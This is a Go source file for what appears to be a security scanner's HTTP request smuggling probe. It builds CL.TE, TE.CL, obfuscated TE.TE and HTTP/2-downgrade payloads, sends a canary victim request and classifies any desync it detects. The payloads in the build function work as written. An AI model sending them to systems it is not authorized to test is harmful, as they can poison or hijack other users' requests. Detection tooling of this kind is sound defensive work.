package probe

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
)

// SmuggleVariant selects the framing disagreement the probe exercises.
type SmuggleVariant string

const (
	// VariantCLTE sends a request that a Content-Length front-end and a
	// Transfer-Encoding back-end disagree about. The leftover byte prefixes the
	// next request, which is the classic "GPOST" desync.
	VariantCLTE SmuggleVariant = "cl.te"
	// VariantTECL is the mirror case: the front-end honours Content-Length while
	// the back-end parses chunked.
	VariantTECL SmuggleVariant = "te.cl"
	// VariantTETE sends duplicate and obfuscated Transfer-Encoding headers to
	// find a proxy pair that disagrees about which one wins.
	VariantTETE SmuggleVariant = "te.te"
	// VariantH2Downgrade writes HTTP/1.1 bytes on a connection that negotiated
	// h2, to catch front-ends that downgrade instead of rejecting.
	VariantH2Downgrade SmuggleVariant = "h2.downgrade"
)

// SmugglingProbe sends one framing-disagreement payload followed by a victim
// request on the same connection and reports whether the stream desynced.
//
// One variant per connection: a successful desync corrupts the stream, so
// running several variants on one conn produces unreadable evidence. Use a
// fresh session per variant (Runner.Rotate does that for a list of probes).
type SmugglingProbe struct {
	Variant SmuggleVariant

	// Timeout bounds each read and write.
	Timeout time.Duration
	// Idle is how long to wait for late responses after the victim request.
	Idle time.Duration
	// BaselinePath is the control request path. The probe sends it first on the
	// same connection so a broken connection is not reported as a desync.
	BaselinePath string

	MaxHeader int64
	MaxBody   int64
}

func (p *SmugglingProbe) Name() string {
	v := p.Variant
	if v == "" {
		v = VariantCLTE
	}
	return "smuggling/" + string(v)
}

// Execute writes the payload and a victim request, then classifies what came
// back. Verdicts are heuristics; Result.Exchanges and Result.Responses carry
// the exact bytes so the verdict can be checked manually.
func (p *SmugglingProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	variant := p.Variant
	if variant == "" {
		variant = VariantCLTE
	}
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	e := newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	nonce := newNonce()
	canaryPath := "/omnislash-" + nonce

	// An h2-negotiated socket speaks HTTP/2 frames, so an HTTP/1.1 control
	// request would be rejected before the downgrade payload is even sent.
	// ALPN is the precondition for that variant instead.
	var base *Response
	if variant != VariantH2Downgrade {
		baseline, err := render(requestSpec{
			Method: "GET",
			Path:   orPath(p.BaselinePath),
			Headers: []rawhttp.Header{
				{Key: "Host", Value: target.HostHeader()},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Connection", Value: "keep-alive"},
			},
		})
		if err != nil {
			return nil, fmt.Errorf("probe: render baseline: %w", err)
		}
		if err := e.write(baseline); err != nil {
			return e.finish(), fmt.Errorf("probe: baseline write: %w", err)
		}
		base, err = e.read()
		if err != nil {
			return e.finish(), fmt.Errorf("probe: baseline read: %w", err)
		}
	}

	if variant == VariantH2Downgrade {
		if err := checkH2Downgrade(conn); err != nil {
			return e.finish(), err
		}
	}

	payload, err := p.build(variant, target, canaryPath)
	if err != nil {
		return e.finish(), err
	}
	if err := e.write(payload); err != nil {
		return e.finish(), fmt.Errorf("probe: payload write: %w", err)
	}
	probeResp, probeErr := e.read()
	if probeErr != nil && !isTimeout(probeErr) && probeResp == nil {
		return e.finish(), fmt.Errorf("probe: payload read: %w", probeErr)
	}
	if variant == VariantH2Downgrade {
		// No victim stage: the only question is whether HTTP/1.1 bytes on an
		// h2-negotiated connection produced an HTTP/1.1 response.
		p.classify(e, variant, base, probeResp, nil, canaryPath, nonce)
		return e.finish(), nil
	}

	// The victim is a valid request. If the stream desynced, its bytes are
	// either prefixed with leftover payload or consumed as a request body.
	victim, err := render(requestSpec{
		Method: "GET",
		Path:   canaryPath,
		Headers: []rawhttp.Header{
			{Key: "Host", Value: target.HostHeader()},
			{Key: "User-Agent", Value: "omnislash-probe/1"},
			{Key: "X-Omnislash-Probe", Value: nonce},
			{Key: "Connection", Value: "keep-alive"},
		},
	})
	if err != nil {
		return e.finish(), fmt.Errorf("probe: render victim: %w", err)
	}
	if err := e.write(victim); err != nil {
		return e.finish(), fmt.Errorf("probe: victim write: %w", err)
	}
	after := e.readUntilIdle(orDuration(p.Idle, 500*time.Millisecond))

	p.classify(e, variant, base, probeResp, after, canaryPath, nonce)
	return e.finish(), nil
}

// ExecuteMulti runs the same experiment with a fresh connection for each
// stage. This is the mode Runner uses in production: a front-end that closes a
// client socket after answering the baseline would otherwise leave the payload
// write on a dead connection, which is what made the single-connection variant
// unusable against real proxy pairs.
func (p *SmugglingProbe) ExecuteMulti(ctx context.Context, target Target, source ConnSource) (*Result, error) {
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	variant := p.Variant
	if variant == "" {
		variant = VariantCLTE
	}
	nonce := newNonce()
	canaryPath := "/omnislash-" + nonce

	var conn net.Conn
	var e *exec
	var base *Response
	var err error
	// conn is reassigned for every stage and source.Dial can return a nil conn
	// with an error. Closing the nil value in a deferred cleanup would panic
	// and hide the real dial failure as a precision-loss engine fault.
	defer func() {
		if conn != nil {
			_ = conn.Close()
		}
	}()

	if variant != VariantH2Downgrade {
		conn, err = source.Dial(ctx)
		if err != nil {
			return nil, fmt.Errorf("probe: dial for baseline: %w", err)
		}
		e = newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
		baseline, err := render(requestSpec{
			Method: "GET",
			Path:   orPath(p.BaselinePath),
			Headers: []rawhttp.Header{
				{Key: "Host", Value: target.HostHeader()},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Connection", Value: "keep-alive"},
			},
		})
		if err != nil {
			return nil, fmt.Errorf("probe: render baseline: %w", err)
		}
		if err := e.write(baseline); err != nil {
			return e.finish(), fmt.Errorf("probe: baseline write: %w", err)
		}
		base, err = e.read()
		if err != nil {
			return e.finish(), fmt.Errorf("probe: baseline read: %w", err)
		}
		// The payload and the victim must not share the baseline socket: a
		// server that answered with Connection: close has discarded it.
		_ = conn.Close()
		conn = nil
	}

	conn, err = source.Dial(ctx)
	if err != nil {
		return nil, fmt.Errorf("probe: dial for payload: %w", err)
	}
	if e == nil {
		e = newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	} else {
		e.attach(conn)
	}
	if variant == VariantH2Downgrade {
		if err := checkH2Downgrade(conn); err != nil {
			return e.finish(), err
		}
	}

	payload, err := p.build(variant, target, canaryPath)
	if err != nil {
		return e.finish(), err
	}
	if err := e.write(payload); err != nil {
		return e.finish(), fmt.Errorf("probe: payload write: %w", err)
	}
	probeResp, probeErr := e.read()
	if probeErr != nil && !isTimeout(probeErr) && probeResp == nil {
		return e.finish(), fmt.Errorf("probe: payload read: %w", probeErr)
	}
	if variant == VariantH2Downgrade {
		p.classify(e, variant, base, probeResp, nil, canaryPath, nonce)
		return e.finish(), nil
	}

	_ = conn.Close()
	conn, err = source.Dial(ctx)
	if err != nil {
		return e.finish(), fmt.Errorf("probe: dial for victim: %w", err)
	}
	e.attach(conn)

	victim, err := render(requestSpec{
		Method: "GET",
		Path:   canaryPath,
		Headers: []rawhttp.Header{
			{Key: "Host", Value: target.HostHeader()},
			{Key: "User-Agent", Value: "omnislash-probe/1"},
			{Key: "X-Omnislash-Probe", Value: nonce},
			{Key: "Connection", Value: "keep-alive"},
		},
	})
	if err != nil {
		return e.finish(), fmt.Errorf("probe: render victim: %w", err)
	}
	if err := e.write(victim); err != nil {
		return e.finish(), fmt.Errorf("probe: victim write: %w", err)
	}
	after := e.readUntilIdle(orDuration(p.Idle, 500*time.Millisecond))

	p.classify(e, variant, base, probeResp, after, canaryPath, nonce)
	return e.finish(), nil
}

func (p *SmugglingProbe) build(variant SmuggleVariant, target Target, canaryPath string) ([]byte, error) {
	host := target.HostHeader()
	switch variant {
	case VariantCLTE:
		// CL=6 covers "0\r\n\r\nG"; the TE side sees an empty chunked body and
		// keeps the trailing "G", which prefixes the victim request line.
		return render(requestSpec{
			Method: "POST",
			Path:   target.RequestPath(),
			Headers: []rawhttp.Header{
				{Key: "Host", Value: host},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
				{Key: "Content-Length", Value: "6"},
				{Key: "Transfer-Encoding", Value: "chunked"},
				{Key: "Connection", Value: "keep-alive"},
			},
			Body: []byte("0\r\n\r\nG"),
		})
	case VariantTECL:
		smuggled := "GET " + canaryPath + " HTTP/1.1\r\nHost: " + host + "\r\nX-Omnislash-Smuggled: 1\r\n\r\n"
		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggled), smuggled)
		// Only the first bytes of the body travel inside Content-Length; the TE
		// side parses the chunk and returns to the request loop early.
		return render(requestSpec{
			Method: "POST",
			Path:   target.RequestPath(),
			Headers: []rawhttp.Header{
				{Key: "Host", Value: host},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
				{Key: "Content-Length", Value: "4"},
				{Key: "Transfer-Encoding", Value: "chunked"},
				{Key: "Connection", Value: "keep-alive"},
			},
			Body: []byte(body),
		})
	case VariantTETE:
		// Obfuscated and duplicated Transfer-Encoding. The exact bytes matter,
		// which is why rawhttp renders the header list verbatim.
		return render(requestSpec{
			Method: "POST",
			Path:   target.RequestPath(),
			Headers: []rawhttp.Header{
				{Key: "Host", Value: host},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Content-Length", Value: "6"},
				{Key: "Transfer-Encoding", Value: "chunked"},
				{Key: "Transfer-Encoding", Value: "identity"},
				{Key: "Transfer-Encoding ", Value: "chunked"},
				{Key: "Connection", Value: "keep-alive"},
			},
			Body: []byte("0\r\n\r\nG"),
		})
	case VariantH2Downgrade:
		return render(requestSpec{
			Method: "GET",
			Path:   canaryPath,
			Headers: []rawhttp.Header{
				{Key: "Host", Value: host},
				{Key: "User-Agent", Value: "omnislash-probe/1"},
				{Key: "Connection", Value: "close"},
			},
		})
	default:
		return nil, fmt.Errorf("probe: unknown smuggling variant %q", variant)
	}
}

// classify turns observed exchanges into findings. Every rule is deliberately
// conservative: a single blocked request is not a desync.
func (p *SmugglingProbe) classify(e *exec, variant SmuggleVariant, baseline, probeResp *Response, after []*Response, canaryPath, nonce string) {
	baselineStatus := 0
	if baseline != nil {
		baselineStatus = baseline.Status
	}
	if variant == VariantH2Downgrade {
		if probeResp != nil && probeResp.Status > 0 {
			e.addFinding(Finding{
				Kind:       "h2_downgrade",
				Confidence: ConfidenceHigh,
				Detail:     "server answered HTTP/1.1 bytes on a connection that negotiated h2",
				Response:   probeResp.Seq,
			})
		}
		return
	}

	// The probe request itself must be answered normally; otherwise the target
	// rejected the payload before any proxy pair saw it.
	if probeResp == nil {
		e.addFinding(Finding{
			Kind:       "no_probe_response",
			Confidence: ConfidenceLow,
			Detail:     "no response to the probe payload within the timeout",
		})
	}

	switch {
	case len(after) > 1:
		e.addFinding(Finding{
			Kind:       "extra_response",
			Confidence: ConfidenceHigh,
			Detail:     fmt.Sprintf("%d responses for one victim request; the smuggled request was likely parsed separately", len(after)),
			Response:   after[0].Seq,
		})
	case len(after) == 0:
		if probeResp != nil {
			e.addFinding(Finding{
				Kind:       "victim_swallowed",
				Confidence: ConfidenceMedium,
				Detail:     "probe was answered but the victim request was not; its bytes were likely consumed as a body",
			})
		}
	default:
		got := after[0].Status
		if got != baselineStatus && isCorruptionStatus(got) {
			e.addFinding(Finding{
				Kind:       "prefix_corruption",
				Confidence: ConfidenceMedium,
				Detail:     fmt.Sprintf("victim status %d differs from baseline %d; leftover payload likely prefixed the request line", got, baselineStatus),
				Response:   after[0].Seq,
			})
		}
	}

	// A response that quotes the canary path or the smuggled marker is direct
	// evidence, regardless of status.
	for _, r := range e.res.Responses {
		if strings.Contains(r.Body, canaryPath) || strings.Contains(r.Body, nonce) || r.hasHeader("X-Omnislash-Smuggled", "1") {
			e.addFinding(Finding{
				Kind:       "canary_echo",
				Confidence: ConfidenceHigh,
				Detail:     "a response carried the smuggled request marker",
				Response:   r.Seq,
			})
			break
		}
	}
}

func isCorruptionStatus(code int) bool {
	switch code {
	case 400, 405, 411, 413, 501:
		return true
	default:
		return false
	}
}

// ErrNoH2ALPN reports a local precondition failure: the pinned session's TLS
// fingerprint did not negotiate h2, so the downgrade probe could not run. It is
// never evidence about the target and is retried on a fresh session.
var ErrNoH2ALPN = errors.New("probe: connection did not negotiate h2")

func checkH2Downgrade(conn net.Conn) error {
	state, ok := connectionState(conn)
	if !ok {
		return fmt.Errorf("%w: no TLS state", ErrNoH2ALPN)
	}
	if proto := state.NegotiatedProtocol; proto != "h2" {
		return fmt.Errorf("%w: got %q", ErrNoH2ALPN, proto)
	}
	return nil
}

func orPath(p string) string {
	if p == "" {
		return "/"
	}
	return p
}

func newNonce() string {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("n%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b[:])
}
